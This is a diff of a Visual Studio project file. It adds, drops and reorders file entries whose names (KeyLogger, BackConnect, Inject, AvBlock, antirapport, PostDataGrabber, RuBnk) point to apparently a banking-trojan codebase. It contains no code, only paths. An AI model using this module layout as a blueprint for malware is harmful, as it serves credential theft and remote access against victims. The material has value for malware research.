@@ -359,10 +359,6 @@
 				>
 			</File>
 			<File
-				RelativePath="..\..\Source\Common\AvBlock.h"
-				>
-			</File>
-			<File
 				RelativePath="..\..\Source\Misc\BackConnect.h"
 				>
 			</File>
@@ -411,11 +407,11 @@
 				>
 			</File>
 			<File
-				RelativePath="..\..\Source\Common\CabPacker.h"
+				RelativePath="..\..\Source\RuBnk\CabPacker.h"
 				>
 			</File>
 			<File
-				RelativePath="..\..\Source\RuBnk\CabPacker.h"
+				RelativePath="..\..\Source\Common\CabPacker.h"
 				>
 			</File>
 			<File
@@ -503,10 +499,6 @@
 				>
 			</File>
 			<File
-				RelativePath="..\..\Source\RuBnk\Inist.h"
-				>
-			</File>
-			<File
 				RelativePath="..\..\Source\Core\Inject.h"
 				>
 			</File>
@@ -524,10 +516,6 @@
 			</File>
 			<File
 				RelativePath="..\..\Source\Common\KeepAlive.h"
-				>
-			</File>
-			<File
-				RelativePath="..\..\Source\Misc\KeyLogger.h"
 				>
 			</File>
 			<File
@@ -576,10 +564,6 @@
 			</File>
 			<File
 				RelativePath="..\..\Source\Core\Plugins.h"
-				>
-			</File>
-			<File
-				RelativePath="..\..\Source\Misc\Poker.h"
 				>
 			</File>
 			<File
@@ -672,10 +656,6 @@
 			>
 			<File
 				RelativePath="..\..\Source\Misc\antirapport.cpp"
-				>
-			</File>
-			<File
-				RelativePath="..\..\Source\Common\AvBlock.cpp"
 				>
 			</File>
 			<File
@@ -811,10 +791,6 @@
 				>
 			</File>
 			<File
-				RelativePath="..\..\Source\RuBnk\Inist.cpp"
-				>
-			</File>
-			<File
 				RelativePath="..\..\Source\Core\Inject.cpp"
 				>
 			</File>
@@ -827,11 +803,11 @@
 				>
 			</File>
 			<File
-				RelativePath="..\..\Source\Common\KeepAlive.cpp"
+				RelativePath="..\..\source\RuBnk\JavaConfig.cpp"
 				>
 			</File>
 			<File
-				RelativePath="..\..\Source\Misc\KeyLogger.cpp"
+				RelativePath="..\..\Source\Common\KeepAlive.cpp"
 				>
 			</File>
 			<File
@@ -875,7 +851,7 @@
 				>
 			</File>
 			<File
-				RelativePath="..\..\Source\Misc\Poker.cpp"
+				RelativePath="..\..\source\Common\PostDataGrabber.cpp"
 				>
 			</File>
 			<File
